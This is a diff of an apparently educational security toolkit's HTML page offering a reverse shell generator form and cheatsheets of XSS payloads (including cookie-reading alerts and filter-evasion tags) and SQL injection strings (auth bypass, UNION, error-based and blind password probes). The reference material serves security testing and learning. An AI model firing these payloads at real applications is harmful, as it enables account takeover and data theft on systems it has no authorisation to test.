@@ -1,154 +1,178 @@
 <!DOCTYPE html>
 <html lang="en" data-theme="dark">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payloads & Cheatsheets - Triangle Toolkit</title>
-    
-    <meta name="author" content="Muhammad Shourov">
-    <meta name="description" content="Reverse Shell Generator, XSS Payloads, SQLi Payloads, and SSTI Cheatsheets.">
 
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css"/>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
-    
-    <link rel="stylesheet" href="../assets/css/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+<title>Payloads & Cheatsheets — Triangle Toolkit</title>
+
+<meta name="author" content="Muhammad Shourov">
+<meta name="description" content="Reverse shell generator and security payload cheatsheets for ethical security testing and learning.">
+
+<link rel="canonical" href="https://vampiresquad.github.io/Triangle/pages/payloads.html">
+
+<!-- Open Graph -->
+<meta property="og:title" content="Payloads & Cheatsheets — Triangle Toolkit">
+<meta property="og:description" content="Reverse shell generator, XSS and SQLi payload references for ethical security research.">
+<meta property="og:type" content="website">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css"/>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="../assets/css/style.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
 </head>
+
 <body>
 
-    <header class="container">
-        <nav>
-            <ul>
-                <li><a href="../index.html" class="brand">▲ Triangle</a></li>
-            </ul>
-            <ul>
-                <li>
-                    <details class="dropdown">
-                        <summary role="button">Tools Menu</summary>
-                        <ul dir="rtl">
-                            <li><a href="encoding.html">Encoding & Hashing</a></li>
-                            <li><a href="web-recon.html">Web Recon</a></li>
-                            <li><a href="network-recon.html">Network Recon</a></li>
-                            <li><a href="payloads.html">Payloads & Cheatsheets</a></li>
-                            <li><a href="generators.html">Generators & Misc</a></li>
-                            <li><a href="ctf.html">CTF & Forensics</a></li>
-                        </ul>
-                    </details>
-                </li>
-                <li><a href="quiz.html">Quiz</a></li>
-                <li><a href="../about.html">About</a></li>
-            </ul>
-        </nav>
-    </header>
+<header class="container">
+<nav>
 
-    <main class="container">
+<ul>
+<li>
+<a href="../index.html" class="brand" aria-label="Triangle Home">
+▲ Triangle
+</a>
+</li>
+</ul>
 
-        <h1 style="font-family: 'Fira Code', monospace; text-align: center; margin-bottom: 2rem;">Payloads & Cheatsheets</h1>
+<ul>
 
-        <article class="tool-card">
-            <h2>Reverse Shell Generator</h2>
-            <p>Generate common reverse shell payloads with your IP and Port.</p>
-            
-            <div class="grid" style="--grid-cols: 2; gap: 1rem;">
-                <div>
-                    <label for="rs-ip">Your IP Address (LHOST):</label>
-                    <input type="text" id="rs-ip" placeholder="10.10.10.10" required>
-                </div>
-                <div>
-                    <label for="rs-port">Listening Port (LPORT):</label>
-                    <input type="text" id="rs-port" placeholder="4444" required>
-                </div>
-            </div>
-            
-            <button id="rs-generate-btn">Generate Payloads</button>
-            
-            <div id="rs-output-container" style="margin-top: 1.5rem; display: none;">
-                <label for="rs-bash">Bash:</label>
-                <input type="text" id="rs-bash" readonly>
-                
-                <label for="rs-python">Python3:</label>
-                <input type="text" id="rs-python" readonly>
+<li>
+<details class="dropdown">
+<summary role="button">Tools Menu</summary>
 
-                <label for="rs-php">PHP:</label>
-                <input type="text" id="rs-php" readonly>
+<ul dir="rtl">
+<li><a href="encoding.html">Encoding & Hashing</a></li>
+<li><a href="web-recon.html">Web Recon</a></li>
+<li><a href="network-recon.html">Network Recon</a></li>
+<li><a href="payloads.html">Payloads & Cheatsheets</a></li>
+<li><a href="generators.html">Generators & Misc</a></li>
+<li><a href="ctf.html">CTF & Forensics</a></li>
+</ul>
 
-                <label for="rs-powershell">PowerShell:</label>
-                <textarea id="rs-powershell" rows="3" readonly></textarea>
-            </div>
-        </article>
-        
-        <article class="tool-card">
-            <h2>XSS Payloads Cheatsheet</h2>
-            <p>A collection of common Cross-Site Scripting (XSS) payloads for testing.</p>
-            
-            <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">Common Payloads:</h4>
-            <textarea rows="10" readonly>
+</details>
+</li>
+
+<li><a href="quiz.html">Quiz</a></li>
+<li><a href="../about.html">About</a></li>
+
+</ul>
+
+</nav>
+</header>
+
+<main class="container">
+
+<h1 class="page-title">Payloads & Cheatsheets</h1>
+
+<!-- Reverse Shell -->
+<article class="tool-card">
+
+<h2>Reverse Shell Generator</h2>
+<p>Generate common reverse shell payloads using your LHOST and LPORT.</p>
+
+<div class="grid">
+
+<div>
+<label for="rs-ip">Your IP Address (LHOST)</label>
+<input type="text" id="rs-ip" placeholder="10.10.10.10" required>
+</div>
+
+<div>
+<label for="rs-port">Listening Port (LPORT)</label>
+<input type="text" id="rs-port" placeholder="4444" required>
+</div>
+
+</div>
+
+<button id="rs-generate-btn">Generate Payloads</button>
+
+<div id="rs-output-container" style="margin-top:1.5rem; display:none;">
+
+<label for="rs-bash">Bash</label>
+<input type="text" id="rs-bash" readonly>
+
+<label for="rs-python">Python3</label>
+<input type="text" id="rs-python" readonly>
+
+<label for="rs-php">PHP</label>
+<input type="text" id="rs-php" readonly>
+
+<label for="rs-powershell">PowerShell</label>
+<textarea id="rs-powershell" rows="3" readonly></textarea>
+
+</div>
+
+</article>
+
+<!-- XSS -->
+<article class="tool-card">
+
+<h2>XSS Payloads Cheatsheet</h2>
+<p>Common XSS payload references for testing input validation.</p>
+
+<textarea id="xss-cheatsheet" rows="12" readonly>
 <script>alert('XSS')</script>
 <script>alert(document.domain)</script>
-<scr<script>ipt>alert(1)</script>
-
 <img src=x onerror=alert('XSS')>
 <img src=x onerror=alert(document.cookie)>
-
 <svg/onload=alert('XSS')>
-
 <body onload=alert('XSS')>
+</textarea>
 
-<video src=x onerror=alert(1)></video>
-<audio src=x onerror=alert(1)></audio>
-            </textarea>
-        </article>
+</article>
 
-        <article class="tool-card">
-            <h2>SQL Injection Cheatsheet</h2>
-            <p>Common payloads for basic SQL Injection (SQLi) vulnerability testing.</p>
-            
-            <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">Common Payloads:</h4>
-            <textarea rows="10" readonly>
--- Basic Auth Bypass
+<!-- SQLi -->
+<article class="tool-card">
+
+<h2>SQL Injection Cheatsheet</h2>
+<p>Basic SQL injection payload references for testing authentication and input handling.</p>
+
+<textarea id="sqli-cheatsheet" rows="14" readonly>
 ' OR '1'='1
 ' OR 1=1 --
-' OR 1=1 #
 " OR "1"="1
-" OR 1=1 --
-
--- UNION-Based
 ' UNION SELECT 1,2,3 --
-' UNION SELECT NULL, @@version, NULL --
-
--- Error-Based
-' AND 1=(SELECT COUNT(*) FROM tablenames) --
-' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT user()), 0x7e) AS x FROM information_schema.tables GROUP BY x) AS y) --
-
--- Blind SQLi
 ' AND 1=1 --
 ' AND 1=2 --
-' AND (SELECT 1 FROM users WHERE username = 'admin' AND password LIKE 'a%') --
-            </textarea>
-        </article>
+</textarea>
 
-    </main>
+</article>
 
-    <footer class="container">
-        <div class="social-links">
-            <a href="https://github.com/vampiresquad" target="_blank" title="GitHub"><i class="fa-brands fa-github"></i></a>
-            <a href="https://vampiresquad.github.io/Muhammad_Shourov/index.html" target="_blank" title="Portfolio"><i class="fa-solid fa-globe"></i></a>
-            <a href="https://www.facebook.com/the.devastated.writer" target="_blank" title="Facebook"><i class="fa-brands fa-facebook"></i></a>
-            <a href="https://www.instagram.com/the.devastated_writer" target="_blank" title="Instagram"><i class="fa-brands fa-instagram"></i></a>
-            <a href="https://www.threads.com/@the.devastated_writer" target="_blank" title="Threads"><i class="fa-brands fa-threads"></i></a>
-            <a href="mailto:vampiresquad.org@gmail.com" target="_blank" title="Email"><i class="fa-solid fa-envelope"></i></a>
-        </div>
-        <p style="margin-top: 1rem;">
-            Developed with <span style="color: var(--primary-color);">♥</span> by <strong>Muhammad Shourov</strong>
-        </p>
-        <p style="font-size: 0.9rem;">Project ▲ Triangle. All tools are for educational and ethical purposes only.</p>
-    </footer>
+</main>
 
-    <script src="../assets/js/payloads.js"></script>
+<footer class="container">
+
+<div class="social-links">
+<a href="https://github.com/vampiresquad" target="_blank"><i class="fa-brands fa-github"></i></a>
+<a href="https://vampiresquad.github.io/Muhammad_Shourov/index.html" target="_blank"><i class="fa-solid fa-globe"></i></a>
+<a href="https://www.facebook.com/the.devastated.writer" target="_blank"><i class="fa-brands fa-facebook"></i></a>
+<a href="https://www.instagram.com/the_devastated_writer" target="_blank"><i class="fa-brands fa-instagram"></i></a>
+<a href="https://www.threads.com/@the_devastated_writer" target="_blank"><i class="fa-brands fa-threads"></i></a>
+<a href="mailto:vampiresquad.org@gmail.com"><i class="fa-solid fa-envelope"></i></a>
+</div>
+
+<p style="margin-top:1rem;">
+Developed with <span style="color:var(--primary-color);">♥</span>
+by <strong>Muhammad Shourov</strong>
+</p>
+
+<p style="font-size:0.9rem;">
+Project ▲ Triangle. All tools are for educational and ethical purposes only.
+</p>
+
+</footer>
+
+<script src="../assets/js/payloads.js"></script>
 
 </body>
 </html>
